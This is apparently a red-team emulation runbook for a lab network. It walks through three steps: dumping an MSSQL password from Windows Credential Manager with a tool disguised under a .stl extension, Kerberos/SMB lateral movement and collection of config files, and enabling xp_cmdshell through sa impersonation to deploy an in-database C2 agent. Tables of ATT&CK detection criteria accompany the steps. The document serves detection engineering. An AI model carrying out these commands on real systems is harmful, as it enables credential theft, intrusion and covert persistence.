# Phase 2 - Lateral Movement, Collection & Privilege Escalation (WS01 → IIS01)

---

## Step 0 - Setup

### Procedures

- Verify TONESHELL C2 session and discovery complete - see Phase 1 Steps 1–2 completion criteria
- Stage `CertEnrollSvc.exe` to the `toneshell` handler payloads subdirectory - required by `xpstage-hex` (Step 4):

  ```bash
  mkdir -p resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell
  cp resources/payloads/priv-escalation/EfsPotato/CertEnrollSvc.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/CertEnrollSvc.exe
  ```

- Stage `go-thehash.exe` to the controlServer payloads directory - required by the TONESHELL `put` in Step 2:

  ```bash
  cp resources/payloads/lateral-movement/go-thehash/go-thehash.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/go-thehash.exe
  ```

- Stage `FwPolicySvc.exe` to the `toneshell` handler payloads subdirectory - required by `xpstage-hex` (Step 6):

  ```bash
  cp resources/payloads/defense-impair/FwPolicySvc/FwPolicySvc.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/FwPolicySvc.exe
  ```

- Stage `credvault.exe` to the controlServer payloads directory - required by the TONESHELL `put` in Step 1 (replaces the PowerShell `CredentialManager` module path - no NuGet install needed on WS01):

  ```bash
  cp resources/payloads/cred-access/credvault/credvault.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/credvault.exe
  ```
- Verify EFSSVC (`Encrypting File System`) is running on IIS01 - required for EFS named-pipe coercion in Step 4. See [`Windows Server 2022-MSSQL.md`](../resources/setup/Windows%20Server%202022-MSSQL.md) for service setup.

---

## Step 1 - Credential Access: MSSQL Password from SSMS Windows Credential Manager

### Voice Track

With IIS01 identified as a target, the adversary harvests the MSSQL password directly from Windows Credential Manager. The developer previously used SSMS on WS01 to connect to `iis01.testlab.local` as `svc_app_dev` with "Remember password" checked - SSMS 20 persists this as a `Generic` credential under a `LegacyGeneric:target=Microsoft:SSMS:20:...` entry. Rather than the well-known PowerShell path - the `CredentialManager` module needs a NuGet bootstrap the lab has no route to fetch, and `powershell.exe` running `Get-StoredCredential` is a heavily signatured telemetry surface - the adversary pushes a small custom Go utility through the existing TONESHELL file-transfer channel. The tool is staged under a benign extension - `credvault.stl`, a stereolithography 3D-model filename - and only renamed to `.exe` at the moment of use, so at rest in the system temp directory it looks like a 3D asset rather than an executable. Because TONESHELL runs inside `labuser`'s session, `credvault.exe` calls `CredEnumerateW` to list the vault and `CredReadW` against the SSMS entry in one pass (`dump`): advapi32 returns the decrypted blob in-session with no offline DPAPI cracking, and the tool prints the plaintext password straight to the C2 console - no PowerShell or `cmdkey.exe` spawn anywhere in the chain.

### Procedures

1. ☣️ Stage `credvault.exe` to WS01 through the TONESHELL file-transfer channel under the masquerading `.stl` extension (payload pre-placed in the controlServer payloads directory in Step 0):

   ```
   put credvault.exe C:\Windows\Temp\credvault.stl
   ```

   - ***Expected Output***
     ```text
     [*] file-put task <task-guid> queued, waiting for transfer ...
     [+] file-put complete: implant:C:\Windows\Temp\credvault.stl
     ```

2. ☣️ Rename the staged payload to its original extension just before execution:

   ```
   cmd /c ren C:\Windows\Temp\credvault.stl credvault.exe
   ```

   - ***Expected Output***
     ```text
     [+] exec complete (exit 0)
     ```

3. Enumerate credentials in the current user's Credential Manager vault to identify the SSMS-saved entry:

   ```
   shell C:\Windows\Temp\credvault.exe enum
   ```

   - ***Expected Output*** (relevant excerpt)
     ```text
     Credential list: 1 entries

     [0] LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
         Type    : Generic
         User    : svc_app_dev
         Persist : LocalMachine
     ```

4. ☣️ Extract the plaintext password from the SSMS credential entry in-session:

   ```
   shell C:\Windows\Temp\credvault.exe dump Microsoft:SSMS
   ```

   - ***Expected Output***
     ```text
     Target   : LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
     User     : svc_app_dev
     Secret   : D3vPortal!2025
     ```

5. Record `svc_app_dev` / `D3vPortal!2025` for use in Steps 2 and 3.

6. ☣️ Remove the tool from WS01:

   ```
   cmd /c del /f C:\Windows\Temp\credvault.exe
   ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| TONESHELL FILE_DOWNLOAD transfers credvault.stl to C:\Windows\Temp\ on WS01 | Command and Control | T1105 | Ingress Tool Transfer | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 writes a new PE-format file `credvault.stl` to `C:\Windows\Temp\` (Sysmon EC=11, creator `EssosUpdate.exe`) - a signed Microsoft binary acting as a C2 implant depositing an inbound non-Microsoft binary into the system temp directory, staged with a benign stereolithography (`.stl`) 3D-model extension and no baseline for file-write activity from this process; content inspection of the on-disk file shows an MZ header under the `.stl` extension | Calibrated - Not Benign | - | TONESHELL implant receives FILE_DOWNLOAD (id=3) task and writes `credvault.stl` (payload `credvault.exe` staged under masquerading extension) to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
| TONESHELL EXEC ren renames staged credvault.stl to credvault.exe on WS01 | Stealth | T1036.008 | Masquerading: Masquerade File Type | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 spawns `cmd.exe /c ren C:\Windows\Temp\credvault.stl credvault.exe` (Sysmon EC=1, parent `EssosUpdate.exe`) - a `cmd.exe` child of the implant re-extensioning a `.stl` file in the system temp directory to an executable `.exe` immediately before execution; baseline: no process on WS01 renames 3D-model files to executables in `C:\Windows\Temp\`, and `cmd.exe` children of `EssosUpdate.exe` are absent (the implant's EXEC path is `CreateProcessW`-direct) | Calibrated - Not Benign | - | WS01 implant runs EXEC task `cmd /c ren C:\Windows\Temp\credvault.stl credvault.exe` restoring the executable extension at the moment of use - masquerade window ends | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
| TONESHELL EXEC spawns credvault.exe on WS01 via CreateProcessW | Execution | T1106 | Native API | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 spawns child process `C:\Windows\Temp\credvault.exe` via `CreateProcessW` with command line `enum` / `dump Microsoft:SSMS` - a signed Microsoft binary spawning a non-Microsoft PE from the system temp directory, with no baseline for `EssosUpdate.exe` child processes | Calibrated - Not Benign | - | TONESHELL implant runs EXEC task (id=5) spawning `C:\Windows\Temp\credvault.exe` - no `cmd.exe` wrapper | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
| credvault.exe enumerates Windows Credential Manager vault via CredEnumerateW on WS01 | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `credvault.exe` (non-Microsoft PE resident in `C:\Windows\Temp\`, parent `EssosUpdate.exe`) on WS01 performs Windows Credential Manager vault enumeration via `advapi32!CredEnumerateW` returning the full vault entry list - credential-store API usage from an unsigned temp-dir process with no baseline for vault enumeration on this developer workstation (baseline vault readers are interactive `cmdkey.exe`/SSMS only) | Calibrated - Not Benign | - | `credvault.exe` calls `CredEnumerateW` to list stored credentials and locate the SSMS-saved `svc_app_dev` entry - `cmdkey /list` equivalent without spawning `cmdkey.exe` | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
| credvault.exe reads SSMS-saved MSSQL password in-session via CredReadW and emits plaintext to console | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `credvault.exe` (non-Microsoft PE resident in `C:\Windows\Temp\`, parent `EssosUpdate.exe`) on WS01 issues `advapi32!CredReadW` with `CRED_TYPE_GENERIC` against target `LegacyGeneric:target=Microsoft:SSMS:` (in-session blob decryption) - SSMS credential-store read by a non-interactive temp-dir process; baseline SSMS credential decryption originates in the interactive SSMS/`sqlcmd` context of the developer user, never from an unsigned PE spawned by the implant chain | Calibrated - Not Benign | - | `credvault.exe` calls `CredReadW` against the `LegacyGeneric:target=Microsoft:SSMS:20:...` entry, decrypts `D3vPortal!2025` in-session as `labuser`, and prints user/secret to the C2 console - no PowerShell in the chain | WS01 (10.12.10.30) | TESTLAB\labuser | [credvault](../resources/payloads/cred-access/credvault/) | - |
| TONESHELL EXEC del removes credvault.exe from C:\Windows\Temp\ on WS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `EssosUpdate.exe` on WS01 spawns `cmd.exe /c del /f C:\Windows\Temp\credvault.exe` - TONESHELL implant removing the dropped tool immediately after credential extraction; Sysmon EC=23/26 deletion of `C:\Windows\Temp\credvault.exe` within the same process chain that created and executed it, with no baseline | Not Calibrated - Not Benign | staging | WS01 implant runs EXEC task `cmd /c del /f C:\Windows\Temp\credvault.exe` removing the tool post-extraction | WS01 (10.12.10.30) | TESTLAB\labuser | - | - |

---

## Step 2 - Lateral Movement & Collection: Valid-Account SMB Access and Automated Collection via go-thehash

### Voice Track

Holding the `svc_app_dev` credentials recovered in Step 1, the adversary sets the database path aside for a moment and first tests the account against IIS01's application share over SMB - a lower-noise lateral-movement and collection vector that never touches MSSQL. The `go-thehash.exe` toolkit (already built for the Pass-the-Hash move in Phase 4) is pushed to WS01 through the existing TONESHELL file-transfer channel under the same benign-extension masquerade as Step 1 - staged as `go-thehash.stl`, renamed to `.exe` only when needed - then invoked with `-krb` and the `svc_app_dev` password. The tool performs a genuine Kerberos logon: it requests a ticket-granting ticket from DC01, obtains a service ticket for `cifs/iis01.testlab.local`, and authenticates to IIS01 with that ticket - leaving the DC's `4768`/`4769` events and a Kerberos network logon on IIS01, telemetry that Pass-the-Hash never produces. Once the SMB session is established as `svc_app_dev`, the tool tree-connects the `DevPortal` share, recursively walks it, and copies every `*.config` and `*.json` file - `appsettings.json` and `web.config` among them - back to a staging directory on WS01. This satisfies the collection objective for the application tier and confirms the domain account is valid before the adversary commits to the database channel.

### Procedures

1. ☣️ Stage `go-thehash.exe` to WS01 through the TONESHELL file-transfer channel under the masquerading `.stl` extension (payload pre-placed in the controlServer payloads directory in Step 0):

   ```
   put go-thehash.exe C:\Windows\Temp\go-thehash.stl
   ```

   - ***Expected Output***
     ```text
     [*] file-put task <task-guid> queued, waiting for transfer ...
     [+] file-put complete: implant:C:\Windows\Temp\go-thehash.stl
     ```

2. ☣️ Rename the staged toolkit to its original extension just before execution:

   ```
   cmd /c ren C:\Windows\Temp\go-thehash.stl go-thehash.exe
   ```

   - ***Expected Output***
     ```text
     [+] exec complete (exit 0)
     ```

3. ☣️ Authenticate to IIS01 over Kerberos as `svc_app_dev` and recursively collect application configuration files from the `DevPortal` share:

   ```
   C:\Windows\Temp\go-thehash.exe -krb -dcip 10.12.10.10 collect iis01.testlab.local TESTLAB.LOCAL svc_app_dev "D3vPortal!2025" DevPortal . C:\Windows\Temp\loot "*.config,*.json"
   ```

   - `-krb` forces a real AS-REQ/TGS-REQ Kerberos logon (not Pass-the-Hash); the target must be a **hostname** so the `cifs/iis01.testlab.local` SPN can be formed
   - `TESTLAB.LOCAL` is the Kerberos realm (the DNS domain); `-dcip 10.12.10.10` pins the KDC to DC01
   - `DevPortal .` sets the share and recursive root; `"*.config,*.json"` selects the collection criteria

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB.LOCAL\svc_app_dev
     [+] Downloaded <n> bytes -> C:\Windows\Temp\loot\appsettings.json
     [+] Downloaded <n> bytes -> C:\Windows\Temp\loot\web.config
     [+] Collected 2 file(s) matching "*.config,*.json" from \\DevPortal\ -> C:\Windows\Temp\loot
     ```

4. Confirm the collected files are present on WS01:

   ```
   cmd /c dir C:\Windows\Temp\loot /s
   ```

   - ***Expected Output***
     ```text
     Directory of C:\Windows\Temp\loot

     ...          appsettings.json
     ...          web.config
     ```

5. ☣️ Remove the tool and the staging loot directory from WS01:

   ```
   cmd /c del /f C:\Windows\Temp\go-thehash.exe
   cmd /c rmdir /s /q C:\Windows\Temp\loot
   ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| TONESHELL FILE_DOWNLOAD transfers go-thehash.stl to C:\Windows\Temp\ on WS01 | Command and Control | T1105 | Ingress Tool Transfer | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 writes a new PE-format file `go-thehash.stl` to `C:\Windows\Temp\` (Sysmon EC=11, creator `EssosUpdate.exe`) - a signed Microsoft binary acting as a C2 implant depositing an inbound non-Microsoft binary into the system temp directory, staged with a benign stereolithography (`.stl`) 3D-model extension and no baseline for file-write activity from this process; content inspection of the on-disk file shows an MZ header under the `.stl` extension | Calibrated - Not Benign | - | TONESHELL implant receives FILE_DOWNLOAD (id=3) task and writes `go-thehash.stl` (payload `go-thehash.exe` staged under masquerading extension) to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| TONESHELL EXEC ren renames staged go-thehash.stl to go-thehash.exe on WS01 | Stealth | T1036.008 | Masquerading: Masquerade File Type | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 spawns `cmd.exe /c ren C:\Windows\Temp\go-thehash.stl go-thehash.exe` (Sysmon EC=1, parent `EssosUpdate.exe`) - a `cmd.exe` child of the implant re-extensioning a `.stl` file in the system temp directory to an executable `.exe` immediately before execution; baseline: no process on WS01 renames 3D-model files to executables in `C:\Windows\Temp\`, and `cmd.exe` children of `EssosUpdate.exe` are absent (the implant's EXEC path is `CreateProcessW`-direct) | Calibrated - Not Benign | - | WS01 implant runs EXEC task `cmd /c ren C:\Windows\Temp\go-thehash.stl go-thehash.exe` restoring the executable extension at the moment of use - masquerade window ends | WS01 (10.12.10.30) | TESTLAB\labuser | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| TONESHELL EXEC spawns go-thehash.exe on WS01 via CreateProcessW | Execution | T1106 | Native API | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 spawns child process `C:\Windows\Temp\go-thehash.exe` via `CreateProcessW` with command line `-krb -dcip 10.12.10.10 collect iis01.testlab.local ...` - a signed Microsoft binary spawning a non-Microsoft PE from the system temp directory, with no baseline for `EssosUpdate.exe` child processes | Calibrated - Not Benign | - | TONESHELL implant runs EXEC task (id=5) spawning `C:\Windows\Temp\go-thehash.exe` with the `-krb collect` command line via `CreateProcessW` - no `cmd.exe` wrapper | WS01 (10.12.10.30) | TESTLAB\labuser | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe Kerberos authentication to DC01 as svc_app_dev (AS-REQ to TGT + cifs service ticket) | Stealth | T1078.002 | Valid Accounts: Domain Accounts | Windows | `go-thehash.exe` on WS01 opens outbound TCP/88 to DC01 `10.12.10.10` (KDC) (Sysmon EC=3, Image `C:\Windows\Temp\go-thehash.exe`), followed on DC01 by Security 4768 (TGT issuance) and 4769 (service ticket for `cifs/iis01.testlab.local`) for Account=`TESTLAB\svc_app_dev` with ClientAddress=`10.12.10.30` (WS01) - a non-Microsoft PE running from the system temp directory performing Kerberos domain authentication; `svc_app_dev` is IIS01's local app service account whose baseline Kerberos origin is IIS01 (10.12.10.20), so a ticket request for this account sourced from the WS01 dev workstation has no baseline | Calibrated - Not Benign | - | `go-thehash.exe` on WS01 sends a Kerberos AS-REQ to DC01 (TCP/88) requesting a TGT for `svc_app_dev`; DC01 KDC responds with the TGT and a `cifs/iis01.testlab.local` service ticket - a non-interactive custom binary generating domain authentication traffic | WS01 (10.12.10.30) / DC01 (10.12.10.10) | TESTLAB\svc_app_dev | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe Kerberos-authenticated SMB2 session to IIS01 as svc_app_dev | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | `go-thehash.exe` on WS01 opens an SMB2 session to IIS01 `10.12.10.20` TCP/445 presenting the Kerberos service ticket for `cifs/iis01.testlab.local` (Sysmon EC=3, Image `C:\Windows\Temp\go-thehash.exe`); on IIS01, Security 4624 Logon Type 3 with LogonProcess=`Kerberos` for Account=`TESTLAB\svc_app_dev` and SourceAddress=`10.12.10.30` (WS01) - a custom temp-dir PE establishing an authenticated SMB session to the app server; this service account's baseline network logon to IIS01 originates on IIS01 itself (IIS app-pool identity), so a Kerberos Type 3 logon sourced from the WS01 dev workstation is anomalous | Calibrated - Not Benign | - | `go-thehash.exe` on WS01 opens an SMB2 session to IIS01 (TCP/445) presenting the Kerberos service ticket for `cifs/iis01.testlab.local`, authenticating as `svc_app_dev`; IIS01 records Security 4624 Logon Type 3 with source address `10.12.10.30` | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\svc_app_dev | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe recursive QUERY_DIRECTORY enumeration of the DevPortal share | Discovery | T1083 | File and Directory Discovery | Windows | `go-thehash.exe` on WS01 issues a burst of recursive SMB2 `QUERY_DIRECTORY` requests to IIS01 `10.12.10.20` TCP/445 enumerating the `DevPortal` share tree (Sysmon EC=3, Image `C:\Windows\Temp\go-thehash.exe`) - recursive remote-share directory enumeration driven by a custom unsigned temp-dir PE, with no baseline on WS01 | Not Calibrated - Not Benign | native-recon | `go-thehash.exe` tree-connects `\\iis01.testlab.local\DevPortal` and issues recursive SMB2 `QUERY_DIRECTORY` calls to enumerate the share tree | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\svc_app_dev | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe reads appsettings.json and web.config from the DevPortal share | Collection | T1119 | Automated Collection | Windows | On IIS01: Security 5145 detailed file access with `ReadData` on `appsettings.json` and `web.config` under the `DevPortal` share by Account=`TESTLAB\svc_app_dev` with ClientAddress=`10.12.10.30` (WS01) - these application config files are read locally by the IIS app identity in baseline; a remote SMB read of both config files from the WS01 dev workstation is anomalous | Calibrated - Not Benign | - | `go-thehash.exe` reads the application configuration files (`appsettings.json`, `web.config`) from the DevPortal share as `svc_app_dev` | IIS01 (10.12.10.20) | TESTLAB\svc_app_dev | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe writes collected configuration files to C:\Windows\Temp\loot\ on WS01 | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | `go-thehash.exe` on WS01 creates files under a purpose-named staging subdirectory `C:\Windows\Temp\loot\` preserving the remote tree (`...\loot\appsettings.json`, `...\loot\web.config`) (Sysmon EC=11, Image `C:\Windows\Temp\go-thehash.exe`) - collection output written to a staging directory in the system temp dir with no baseline for this file layout | Not Calibrated - Not Benign | staging | `go-thehash.exe` writes the collected DevPortal files under `C:\Windows\Temp\loot\` on WS01, preserving the remote directory tree | WS01 (10.12.10.30) | TESTLAB\labuser | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| TONESHELL EXEC del removes go-thehash.exe and loot directory from WS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 spawns `cmd.exe` running `del /f C:\Windows\Temp\go-thehash.exe` and `rmdir /s /q C:\Windows\Temp\loot` - TONESHELL implant removing the tool and staging artifacts post-collection; Sysmon EC=23 deletion of `go-thehash.exe` and the `loot` directory in one process chain, with no baseline | Not Calibrated - Not Benign | staging | WS01 implant runs EXEC task `cmd /c del /f C:\Windows\Temp\go-thehash.exe` and `cmd /c rmdir /s /q C:\Windows\Temp\loot` removing the tool and staging loot after collection | WS01 (10.12.10.30) | TESTLAB\labuser | - | - |

---

## Step 3 - Lateral Movement: MSSQL Authentication, Privilege Impersonation, and xp_cmdshell Activation

### Voice Track

Using the `svc_app_dev` credentials extracted from Windows Credential Manager in Step 1, the adversary authenticates to the MSSQL instance on IIS01 from WS01 via `sqlcmd`. The `svc_app_dev` login holds an `IMPERSONATE ON LOGIN::sa` privilege - a misconfiguration in the DevPortalDB setup - which the adversary exploits to switch SQL execution context to `sa`. From the `sa` context, they enable both `Ole Automation Procedures` (required for the sp_OA COM object write channel used in subsequent staging) and `xp_cmdshell` (which SQL Server disables by default). With `xp_cmdshell` active, each SQL query can spawn `cmd.exe` as the SQL Server service account (`NT SERVICE\MSSQL$SQLEXPRESS`) on IIS01, providing OS-level remote code execution. The adversary confirms execution with a `whoami` check, establishing the full execution and staging channel on IIS01 for subsequent phases. All of this is driven through the `xpinit` command in `toneshell_shell.py`, which routes sqlcmd tasks through the existing TONESHELL implant on WS01.

### Procedures

1. ☣️ In `toneshell_shell.py`, with WS01 session active - initialize the MSSQL execution channel:

   ```
   xpinit iis01.testlab.local:1433 svc_app_dev D3vPortal!2025
   ```

   This sends three sequential sqlcmd tasks through the TONESHELL implant on WS01:
   - Authenticates as `svc_app_dev`, impersonates `sa`, enables `Ole Automation Procedures` and `xp_cmdshell` via `sp_configure`
   - Verifies OS command execution by running `xp_cmdshell 'whoami'`

   - ***Expected Output***
     ```text
     [+] xpinit OK - context: nt service\mssql$sqlexpress
     ```

2. ☣️ Deploy the xpagent in-database C2 agent on IIS01:

   ```
   xpagent init
   ```

   Copies `xpagent_init.sql` from `controlServer/sql/` to the C2 payloads directory, pushes it to `C:\Windows\Temp\` on WS01 as `xpagent_init.stl` (benign-extension masquerade; `sqlcmd -i` accepts any extension so no rename is needed) via TONESHELL FILE_DOWNLOAD, then runs `sqlcmd -i` against `IIS01\SQLEXPRESS`. The DDL creates the `xpagent` database with `dbo.cmd` / `dbo.out` tables, an AFTER INSERT trigger, a Service Broker queue + service, and the `agent_worker` activation procedure. Subsequent steps use `xpexec` to dispatch commands through this channel instead of the sp_OA file-staging path.

   - ***Expected Output***
     ```text
     [*] xpagent_init: pushing SQL to WS01 ...
     [*] xpagent_init: running xpagent_init.stl on IIS01 ...
     [+] xpagent_init done
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| sqlcmd.exe on WS01 opens authenticated TCP/1433 session to MSSQL on IIS01 as svc_app_dev | Lateral Movement | T1021 | Remote Services | Windows | `sqlcmd.exe` spawned by a non-SSMS parent process on WS01 establishes outbound TCP/1433 connection to `10.12.10.20` - WS01 is a developer workstation, not a DBA or app-tier host | Calibrated - Not Benign | - | TONESHELL implant on WS01 spawns `sqlcmd.exe` to open an authenticated TCP/1433 session to IIS01 MSSQL as `svc_app_dev` | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / svc_app_dev | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
| EXECUTE AS LOGIN sa MSSQL privilege impersonation on IIS01 | Privilege Escalation | T1134 | Access Token Manipulation | Windows | N/A - C3: MSSQL EXECUTE AS LOGIN context switch is internal to sqlservr.exe on IIS01 - no process, file, registry, or network artifact on the declared EDR surface | Not Calibrated - Not Benign | out-of-surface | `svc_app_dev` issues `EXECUTE AS LOGIN='sa'` to switch SQL execution context, exploiting the `IMPERSONATE` privilege grant | IIS01 (10.12.10.20) | svc_app_dev | - | - |
| WS01 implant spawns sqlcmd batch enabling Ole Automation Procedures and xp_cmdshell via sp_configure and granting ADMINISTER BULK OPERATIONS to svc_app_dev on IIS01 | Persistence | T1505.001 | Server Software Component: SQL Stored Procedures | Windows | N/A - C3: sp_configure T-SQL batch enabling Ole Automation Procedures and xp_cmdshell executes entirely within sqlservr.exe on IIS01 - no process creation, file write, registry, or network artifact on the declared EDR surface; the WS01 sqlcmd process creation evidences T1021 (separate row) | Not Calibrated - Not Benign | out-of-surface | `xpinit` T-SQL batch: `sp_configure 'Ole Automation Procedures',1` + `sp_configure 'xp_cmdshell',1` executed under sa context; `GRANT ADMINISTER BULK OPERATIONS TO svc_app_dev` - persistent MSSQL configuration change on IIS01, required for all subsequent xpstage/xpfile/xpexfil channels | IIS01 (10.12.10.20) | sa | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
| xp_cmdshell invoked to spawn cmd.exe on IIS01 as NT SERVICE\MSSQL$SQLEXPRESS | Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | `sqlservr.exe` spawns `cmd.exe` on IIS01 - MSSQL service has no baseline for spawning OS command shells | Calibrated - Not Benign | - | `xpinit` invokes `xp_cmdshell 'whoami'` to verify OS command execution - `sqlservr.exe` spawns `cmd.exe` as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01; xp_cmdshell was enabled in the preceding sp_configure batch | IIS01 (10.12.10.20) | sa / NT SERVICE\MSSQL$SQLEXPRESS | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| WS01 implant spawns sqlcmd SELECT @@SERVERNAME on IIS01 as xpinit server identity confirmation | Discovery | T1082 | System Information Discovery | Windows | N/A - C3: SELECT @@SERVERNAME executes entirely within sqlservr.exe on IIS01 - no process creation, file write, registry, or network artifact on the declared EDR surface; the WS01 sqlcmd process creation evidences T1021 (separate row) | Not Calibrated - Not Benign | out-of-surface | `xpinit` executes `SELECT @@SERVERNAME` on IIS01 to confirm server identity; result printed to operator as xpinit connectivity confirmation | IIS01 (10.12.10.20) | svc_app_dev | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
| WS01 implant spawns sqlcmd SELECT sys.dm_server_services on IIS01 enumerating SQL service account | Discovery | T1007 | System Service Discovery | Windows | N/A - C3: SELECT service_account FROM sys.dm_server_services executes entirely within sqlservr.exe on IIS01 - no process creation, file write, registry, or network artifact on the declared EDR surface; the WS01 sqlcmd process creation evidences T1021 (separate row) | Not Calibrated - Not Benign | out-of-surface | `xpinit` executes `SELECT service_account FROM sys.dm_server_services WHERE servicename LIKE 'SQL Server%'` on IIS01 to identify the MSSQL service account (`NT SERVICE\MSSQL$SQLEXPRESS`); result confirms execution context for all subsequent xp_cmdshell spawns | IIS01 (10.12.10.20) | svc_app_dev | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
| TONESHELL FILE_DOWNLOAD transfers xpagent_init.stl to C:\Windows\Temp\ on WS01 | Command and Control | T1105 | Ingress Tool Transfer | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 writes `xpagent_init.stl` to `C:\Windows\Temp\` - signed Microsoft binary with no baseline for depositing files to the system temp directory, staged with a benign stereolithography (`.stl`) 3D-model extension; content inspection of the on-disk file shows SQL DDL text under the `.stl` extension; same file-write signal pattern as the xpstage-hex INSERT SQL transfer row in Step 4 | Not Calibrated - Not Benign | transport | TONESHELL implant receives FILE_DOWNLOAD (id=3) task and writes `xpagent_init.stl` (DDL script `xpagent_init.sql` staged under masquerading extension) to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| sqlcmd on WS01 executes xpagent DDL creating xpagent database and objects on IIS01 | Persistence | T1505.001 | Server Software Component: SQL Stored Procedures | Windows | N/A - C3: DDL execution creating `xpagent` database, tables, Service Broker objects, and `agent_worker` activation procedure runs inside `sqlservr.exe` on IIS01 - no process creation, file write, or network event from this DDL surfaces on the declared EDR telemetry; WS01-side `sqlcmd -i` invocation evidences T1021 (already a separate row), not this technique | Not Calibrated - Not Benign | out-of-surface | WS01 implant runs `sqlcmd -i C:\Windows\Temp\xpagent_init.stl` against `IIS01\SQLEXPRESS`; DDL creates `xpagent` database, `dbo.cmd` / `dbo.out` tables, AFTER INSERT trigger, Service Broker queue + service, and `agent_worker` activation procedure | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | svc_app_dev / sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| xpagent dbo.cmd AFTER INSERT trigger fires Service Broker conversation SEND dispatching operator commands to agent_worker queue on IIS01 | Persistence | T1546 | Event Triggered Execution | Windows | N/A - C3: AFTER INSERT trigger on xpagent.dbo.cmd and Service Broker queue activation execute entirely within sqlservr.exe on IIS01 - no process creation, file write, registry, or network artifact on the declared EDR surface; Service Broker message routing and queue dispatch are internal SQL Server mechanisms not visible to EDR | Not Calibrated - Not Benign | out-of-surface | AFTER INSERT trigger on `xpagent.dbo.cmd` fires `BEGIN DIALOG CONVERSATION ... SEND` on each operator command INSERT, routing messages to the Service Broker queue activating `agent_worker`; SQL-level event-triggered execution requiring no external poll from the operator side | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| TONESHELL EXEC del deletes xpagent_init.stl from C:\Windows\Temp\ on WS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `EssosUpdate.exe` spawns `cmd.exe /c del /f C:\Windows\Temp\xpagent_init.stl` on WS01 - TONESHELL implant removing the DDL staging file post-deployment; same process chain as the xpstage-hex INSERT SQL deletion row in Step 4 | Not Calibrated - Not Benign | staging | WS01 implant runs EXEC task `cmd /c del /f C:\Windows\Temp\xpagent_init.stl` removing the DDL staging script after deployment | WS01 (10.12.10.30) | TESTLAB\labuser | - | - |

---

